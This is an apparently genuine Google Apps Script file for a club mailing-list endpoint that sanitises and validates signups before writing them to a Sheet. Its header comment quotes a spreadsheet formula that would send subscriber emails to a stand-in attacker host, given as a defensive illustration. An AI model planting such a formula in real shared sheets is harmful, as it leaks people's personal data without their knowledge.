/**
 * Mailing-list endpoint for the LCC website.
 *
 * This file is kept in the repo as the source of truth for what the site's
 * signup form posts to. It does NOT run from here: paste it into the Apps
 * Script project bound to the mailing-list Google Sheet and deploy it.
 *
 * ---------------------------------------------------------------------------
 * WHY THIS FILE EXISTS
 *
 * The deployment URL ships inside the website's JavaScript bundle, so it is
 * public. Anyone can POST to it directly with curl, bypassing the site and
 * every check in it. The honeypot and minimum-fill-time checks in
 * src/app/page.tsx only stop bots that submit through the real form; they are
 * not a defence for this endpoint.
 *
 * That matters most because the Sheet is link-shared with the exec team.
 * Google Sheets evaluates formulas when a person opens the file, so a row
 * containing something like
 *
 *     =IMPORTXML("https://attacker.example/?d="&JOIN(",",B2:B999),"//x")
 *
 * would silently send every subscriber's email to an attacker's server the
 * moment any exec opens the Sheet. sanitize_() below is what prevents that.
 *
 * ---------------------------------------------------------------------------
 * DEPLOYMENT SETTINGS (must match, or the site's fetch will fail)
 *   Execute as:      Me
 *   Who has access:  Anyone
 *
 * The site posts with mode: 'no-cors', so it cannot read the response. The
 * returns below are for manual testing only; the form always shows success to
 * the user regardless.
 * ---------------------------------------------------------------------------
 */

/** Tab within the spreadsheet that rows are appended to. */
var SHEET_NAME = 'Sheet1';

/** Maximum accepted lengths. Without caps, one request can push a multi-megabyte
 *  string into a cell and make the Sheet unusable. */
var MAX_NAME = 100;
var MAX_EMAIL = 254; // RFC 5321 maximum address length

/** Global write throttle. Apps Script does NOT expose the requester's IP, so
 *  per-person limiting is impossible; this caps total writes in a rolling
 *  window instead.
 *
 *  Sized for the worst legitimate burst, not for an attack. A global counter
 *  cannot distinguish an attacker from a queue of real students anyway, so the
 *  only thing a tight cap achieves is dropping real signups: put a QR code on
 *  screen at a mixer and a hundred people can submit inside a minute. The cap
 *  exists to stop a runaway loop filling the Sheet, nothing more. */
var MAX_WRITES_PER_WINDOW = 200;
var WINDOW_SECONDS = 60;

/**
 * Neutralises anything Sheets could interpret as a formula.
 *
 * A leading apostrophe makes Sheets treat the cell as literal text: it renders
 * normally and is never evaluated. Tab and carriage return are included
 * because Sheets also treats them as formula-ish leading characters.
 */
function sanitize_(value, maxLength) {
  var s = String(value == null ? '' : value).trim().slice(0, maxLength);
  // Strip control characters that could break the row apart.
  s = s.replace(/[\x00-\x1F\x7F]/g, '');
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/**
 * Server-side email check. The client validates too, but a direct POST skips
 * that, so this is the one that actually counts.
 */
function isValidEmail_(email) {
  if (!email || email.length > MAX_EMAIL) return false;
  if (!/^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(email)) return false;
  if (email.indexOf('..') !== -1) return false;       // consecutive dots
  if (/^[.@]|[.@]$/.test(email)) return false;        // leading/trailing . or @
  var parts = email.split('@');
  if (parts.length !== 2) return false;               // exactly one @
  if (parts[0].length > 64) return false;             // RFC 5321 local-part limit
  // A dot may not start or end either side of the @.
  var dotEdge = /^\.|\.$/;
  if (dotEdge.test(parts[0]) || dotEdge.test(parts[1])) return false;
  return true;
}

/**
 * Rejects content that no real signup contains. This is the "stop junk getting
 * into the Sheet" layer, separate from sanitize_(), which stops the Sheet
 * executing what does get in.
 *
 * Deliberately structural rather than a keyword blocklist: keyword lists go
 * stale and generate false positives, whereas "a name should not contain a URL"
 * holds regardless of what the spam of the day says.
 *
 * Returns a short reason string, or null when the submission looks fine.
 */
function rejectionReason_(name, email) {
  var both = name + ' ' + email;

  // Markup or template injection attempts.
  if (/<[a-z\/!]/i.test(both)) return 'markup';
  if (/\{\{|\}\}|\$\{/.test(both)) return 'template';

  // Links: the single most common junk in a name field.
  if (/https?:\/\/|www\.|\[url|\[link|<a\s/i.test(both)) return 'link';

  // Bidirectional-override characters, used to disguise text visually.
  if (/[‪-‮⁦-⁩]/.test(both)) return 'bidi';

  // Newlines would split one submission across Sheet rows.
  if (/[\r\n]/.test(both)) return 'newline';

  // The name should read like a name.
  if (!/\p{L}/u.test(name)) return 'name_no_letters';
  if (/[<>{}\[\]|\\^~`=]/.test(name)) return 'name_symbols';
  if (/(.)\1{6,}/.test(name)) return 'name_repeat';        // "aaaaaaaa"
  if ((name.match(/\d/g) || []).length > 4) return 'name_digits';
  if (name.length < 2) return 'name_too_short';

  return null;
}

/**
 * Rolling write throttle.
 * Returns true when the request is allowed to proceed.
 *
 * Read-then-write on the cache is not atomic, so concurrent requests could
 * otherwise both read the same count and both write. The lock closes that.
 *
 * Note the failure direction: if the lock cannot be taken, this ALLOWS the
 * write. The cost of wrongly allowing is a row or two over the cap; the cost of
 * wrongly denying is a real student silently not joining the list. Fail open.
 */
function underRateLimit_() {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(2000)) return true;
  try {
    var cache = CacheService.getScriptCache();
    var count = Number(cache.get('write_count') || 0);
    if (count >= MAX_WRITES_PER_WINDOW) return false;
    cache.put('write_count', String(count + 1), WINDOW_SECONDS);
    return true;
  } finally {
    lock.releaseLock();
  }
}

/**
 * Forces the data columns to plain-text format, as a second layer behind
 * sanitize_(). Runs once and records that it has, since changing formats on
 * every request would be slow.
 */
function ensurePlainTextColumns_(sheet) {
  var props = PropertiesService.getScriptProperties();
  if (props.getProperty('columns_formatted') === 'yes') return;
  sheet.getRange('A:C').setNumberFormat('@');
  props.setProperty('columns_formatted', 'yes');
}

function getSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  if (!ss) throw new Error('No bound spreadsheet. Attach this script to the Sheet.');
  var sheet = ss.getSheetByName(SHEET_NAME) || ss.getSheets()[0];
  if (!sheet) throw new Error('No sheet found named ' + SHEET_NAME);
  return sheet;
}

function json_(status, message) {
  return ContentService
    .createTextOutput(JSON.stringify({ status: status, message: message }))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * The site posts JSON as text/plain:  { "name": "...", "email": "..." }
 */
function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return json_('error', 'Empty request body.');
    }

    var payload;
    try {
      payload = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return json_('error', 'Body was not valid JSON.');
    }

    var name = sanitize_(payload.name, MAX_NAME);
    var email = sanitize_(payload.email, MAX_EMAIL);

    if (!name) return json_('error', 'Name is required.');

    // Validate against the raw values: sanitize_ may have prefixed an
    // apostrophe, which would otherwise fail these checks.
    var rawName = String(payload.name == null ? '' : payload.name).trim();
    var rawEmail = String(payload.email == null ? '' : payload.email).trim();

    if (!isValidEmail_(rawEmail)) {
      return json_('error', 'Email is not valid.');
    }

    var reason = rejectionReason_(rawName, rawEmail);
    if (reason) {
      // Logged so a legitimate rejection can be traced, but nothing is written.
      console.warn('Rejected submission: ' + reason);
      return json_('error', 'Submission rejected.');
    }

    var sheet = getSheet_();
    ensurePlainTextColumns_(sheet);

    // Checked here, not at the top of doPost, so the budget is only spent on
    // rows that actually get written. Guarding the whole function meant junk
    // requests burned the same allowance as real signups: a burst of them
    // pushed genuine students into 'rate_limited' while the site still showed
    // those students the success message, because it posts with mode:'no-cors'
    // and cannot read this response.
    if (!underRateLimit_()) {
      return json_('rate_limited', 'Too many submissions right now.');
    }

    sheet.appendRow([new Date(), name, email]);

    return json_('ok', 'Subscribed.');
  } catch (err) {
    // Never surface internals; the site cannot read this response anyway.
    console.error(err);
    return json_('error', 'Unexpected error.');
  }
}

/** Visiting the deployment URL in a browser should not look broken. */
function doGet() {
  return json_('ok', 'LCC mailing list endpoint. POST JSON to subscribe.');
}
